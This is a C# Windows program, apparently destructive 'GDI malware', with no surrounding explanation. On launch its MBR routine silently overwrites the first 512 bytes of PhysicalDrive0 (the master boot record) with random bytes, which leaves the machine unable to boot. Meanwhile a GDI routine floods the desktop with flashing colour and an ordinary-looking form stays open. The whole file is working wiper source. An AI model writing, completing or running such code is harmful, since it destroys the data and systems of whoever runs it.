using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace BOOM
{
    static class Program
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr h);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr h, IntPtr o);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(int c);

        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, int rop);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int m);

        [DllImport("gdi32.dll")]
        static extern IntPtr DeleteObject(IntPtr h);

        private static bool stopGDI = false;

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Thread mbrThread = new Thread(MBR) { IsBackground = true };
            mbrThread.Start();

            Thread gdiThread = new Thread(GDI) { IsBackground = true };
            gdiThread.Start();

            Application.Run(new Form1());

            stopGDI = true;
        }

        static void MBR()
        {
            using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
            {
                byte[] mbrData = new Byte[512];
                Random rand = new Random();
                rand.NextBytes(mbrData);

                fs.Write(mbrData, 0, mbrData.Length);
            }
        }
        static void GDI()
        {
            Random rand = new Random();

            while (!stopGDI)
            {
                IntPtr desktopHandle = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(desktopHandle);

                int screenWidth = GetSystemMetrics(0);
                int screenHeight = GetSystemMetrics(1);

                int r = rand.Next(200, 256);
                int g = rand.Next(0, 256);
                int b = rand.Next(0, 256);
                int color = (r << 16) | (g << 8) | b;

                IntPtr brush = CreateSolidBrush(color);
                SelectObject(hdc, brush);
                PatBlt(hdc, 0, 0, screenWidth, screenHeight, 0x005A0049);

                DeleteObject(brush);

                Thread.Sleep(50);
            }
        }
    }
}
